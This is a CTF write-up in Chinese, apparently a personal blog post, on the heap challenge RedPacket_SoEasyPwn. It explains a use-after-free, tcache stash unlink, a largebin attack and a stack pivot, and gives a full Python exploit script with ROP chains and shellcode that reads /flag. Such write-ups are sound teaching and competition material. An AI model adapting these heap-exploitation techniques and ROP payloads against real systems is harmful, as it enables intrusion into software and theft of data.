# RedPacket_SoEasyPwn



### 总结

根据本题，学习与收获有：

- 总结一个特殊的`largebin attack`，其实也不特殊，照着源码就能看出来，但是往往很少有题目这么考。即在往堆头节点插入大小相同的`chunk`时，若更改了堆头节点的`fd`，即可有一次任意地址写堆地址的机会。
- `tcache bin stash unlink`，对于`smallbin`来说，若需要任意地址写堆地址，那么`tcache bin`里面填`6`个，然后伪造`victim`的`bk`的`bk`。利用`bck->fd = victim`任意地址写。如果需要任意地址分配，则只需填满`5`个即可，并需要`victim`的`bk1`的`bk2`的`bk`需要可写。可以往`__malloc_hook`上方走，劫持`__malloc_hook`，然后观察寄存器，寻找合适的`gadget`进行后续的利用。

<!-- more -->

### 题目分析

#### checksec

![image-20210820220650847](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820220650847.png)

`libc`版本为`2.29`

#### 漏洞分析

漏洞很明显，`throw`分支一个`UAF`：

![image-20210820220830934](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820220830934.png)

然后在`gift`分支，可进行栈迁移：

![image-20210820220959291](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820220959291.png)

但是需要堆上某个地址的内容需要大于等于`0x7f0000000000`。

### 利用思路

关于本题，有三个利用思路：

#### 思路一：

利用栈上残存的信息，将`0x1010`的那个大`chunk`给释放掉，然后再分配到指定地方进行赋值，即可触发栈迁移。

栈如下：

![image-20210820224452820](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820224452820.png)

![image-20210820225251747](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820225251747.png)

可以泄露地址，还可以通过更改`idx = 2`的内容，实际改的时栈上的指针，因此可以去释放`0x1010`大小的这个`chunk`。这应该是非预期解之一，因为本题存储堆指针的区域并未置空。

#### 思路二：

利用`tcachebin stash unlink`，可以将目标区域刷为一个`libc`地址，就能绕过校验，然后进行栈迁移，利用`rop`读取`flag`。

利用的区域的`libc`源码为：

![image-20210820230923944](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820230923944.png)

#### 思路三：

利用`0x410`大小的`largebin`，进行`largebin attack`。这个大小的`chunk`既在`tcachebin`的范围，也在`largebin`的范围。当插入相同大小的`chunk`时，若存在堆头节点，则可以修改`fd`，然后让任意地址写堆地址，这个时候需要错位`1`个字节，因为堆地址都是`0x55/56`开头，明显小于`0x7f`。

利用的源码在：

![image-20210820231216949](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820231216949.png)

利用的时候，效果如下：

![image-20210820231511138](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820231511138.png)

### Exp

直接把三种思路的都放一起，分别是`3`个`attack`函数：

```python
#!/usr/bin/python3
from pwncli import *
cli_script()

libc:ELF = gift['libc']

idx_size = {1:0x10, 2:0xf0, 3:0x300, 4:0x400}

context.buffer_size=0x1000

def get(p:tube, idx, sizeidx, content=None):
    if content is None:
        content = "a\n"
    p.sendlineafter("Your input: ", "1")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    p.sendlineafter("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ", str(sizeidx))
    p.sendafter("Please input content: ", content)


def throw(p:tube, idx):
    p.sendlineafter("Your input: ", "2")
    p.sendlineafter("Please input the red packet idx: ", str(idx))


# only one time
def change(p:tube, idx, content):
    p.sendlineafter("Your input: ", "3")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    p.recvuntil("Please input content: ")
    p.send(content)


def watch(p:tube, idx):
    p.sendlineafter("Your input: ", "4")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    msg = p.recvline()
    info("recv msg:{}".format(msg))
    return u64(msg[:-1].ljust(8, b"\x00"))


def stack_overflow(p:tube, content):
    p.sendlineafter("Your input: ", "666")
    p.sendafter("What do you want to say?", content)


def exit_p(p:tube):
    p.sendlineafter("Your input: ", "5")


def get_rop(libc_base_addr, fill_chunk_addr):
    rax_ret = libc_base_addr + 0x47cf8
    rdi_ret = libc_base_addr + 0x26542
    rsi_ret = libc_base_addr + 0x26f9e
    rdx_ret = libc_base_addr + 0x12bda6
    sys_ret = libc_base_addr + 0xcf6c5
    rop = flat(rdi_ret, fill_chunk_addr,
                rsi_ret, 0,
                rax_ret, 2,
                sys_ret,
                rdi_ret, 3,
                rsi_ret, fill_chunk_addr+0x350,
                rdx_ret, 0x30,
                rax_ret, 0,
                sys_ret,
                rdi_ret, 1,
                rsi_ret, fill_chunk_addr+0x350,
                rdx_ret, 0x30,
                rax_ret, 1,
                sys_ret)
    return rop


# use stack pivot
def attack(p:tube):
    # leak heap address
    get(p, 5, 4)
    leak_heap_addr = watch(p, 2)
    log_address("leak_heap_addr", leak_heap_addr)
    heap_base_addr = leak_heap_addr - 0x1270

    # leak libc addr
    leak_libc_addr = watch(p, 3)
    libc_base_addr = leak_libc_addr - 0x2199f0
    libc.address = libc_base_addr
    log_address("libc_base_addr",libc_base_addr)

    # to free chunk 0x1010
    victim_address = heap_base_addr + 0x260

    change(p, 2, p64(victim_address))
    throw(p, 5)

    # to fill 0x800 to 0x7fffffffffff
    get(p, 0, 2)
    get(p, 1, 4)

    # rop payload
    fill_chunk_addr = heap_base_addr + 0x770
    rop = get_rop(libc_base_addr, fill_chunk_addr)

    payload = flat({
        0:"/flag".ljust(8, "\x00"),
        0x18: rop,
        0x2e8: 0, 
        0x2f0: 0x7fffffffffff,
        0x2f8: 0
    }, filler="\x00")

    get(p, 3, 4, payload)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)
    p.interactive()


# use tcache stash attack
def attack2(p:tube):
    chunk_type = 4

    # leak addr
    for i in range(8):
        get(p, i, chunk_type)
    get(p, 8, 1) # gap
    get(p, 9, chunk_type)
    get(p, 10, 1) # gap

    # leak heap addr
    throw(p, 0)
    throw(p, 1)
    leak_heap_addr = watch(p, 1)
    heap_base_addr = leak_heap_addr - 0x1270
    log_address("heap_base_addr", heap_base_addr)

    # fill 0x400 7
    for i in range(2, 7):
        throw(p, i)

    # fill 0x100 6
    for i in range(6):
        get(p, i, 2)
        throw(p, i)
    
    # leak libc addr
    throw(p, 7)
    leak_libc_addr = watch(p, 7)
    libc_base_addr = leak_libc_addr - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    get(p, 0, 3)

    throw(p, 9)
    get(p, 1, 3)

    # put 0x100 to smallbin
    get(p, 2, 4)

    # change smallbin 2 's bk to 'target addr - 0x10'
    fill_chunk_addr = 0x3310 + heap_base_addr
    rop = get_rop(libc_base_addr, fill_chunk_addr)

    payload = flat({
        0:"/flag".ljust(8, "\x00"),
        0x18: rop,
        0x300:0,
        0x308:0x101,
        0x310:heap_base_addr+0x31e0,
        0x318:heap_base_addr+0xa50
    }, filler='\x00')

    change(p, 9, payload)

    # stash attack
    get(p, 3, 2)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)

    p.interactive()


# use large bin attack
def attack3(p:tube):
    chunk_type = 4

    # leak addr
    for i in range(8):
        get(p, i, chunk_type)
    get(p, 8, 1) # gap
    get(p, 9, chunk_type)
    get(p, 10, 1) # gap
    get(p, 11, chunk_type)
    get(p, 12, 1) # gap

    # leak heap addr
    throw(p, 0)
    throw(p, 1)
    leak_heap_addr = watch(p, 1)
    heap_base_addr = leak_heap_addr - 0x1270
    log_address("heap_base_addr", heap_base_addr)

    # fill 0x400 7
    for i in range(2, 7):
        throw(p, i)
    
    # leak libc addr
    throw(p, 7)
    leak_libc_addr = watch(p, 7)
    libc_base_addr = leak_libc_addr - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # to get a large bin
    throw(p, 9)
    fake_fd = heap_base_addr + 0x3310-0x10
    target_write_addr = heap_base_addr + 0xa60+1
    payload = flat(0, target_write_addr - 0x10)
    get(p, 0, 1, payload)

    throw(p, 11)
    
    # large bin attack
    change(p, 7, p64(fake_fd))
    

    fill_chunk_addr = 0x3330 + heap_base_addr
    rdi_ret = libc_base_addr + 0x26542
    rsi_ret = libc_base_addr + 0x26f9e
    rdx_ret = libc_base_addr + 0x12bda6
    rsp_ret = libc_base_addr + 0x30e4e
    retf = libc_base_addr + 0x12c351

    shellcode_addr = fill_chunk_addr+0x100

    rop = flat([
        rdi_ret, heap_base_addr,
        rsi_ret, 0x4000,
        rdx_ret, 7,
        libc.sym['mprotect'],
        shellcode_addr,
    ])

    shellcode = asm(shellcraft.cat("/flag"))

    payload = flat({
        0:"input:\n".ljust(8, "\x00"),
        0x18: rop,
        0x100: shellcode
    }, filler='\x00', length=0x250)

    get(p, 1, 3, payload)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)

    p.interactive()

attack3(gift['io'])
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-18-redpacket-soeasypwn/  

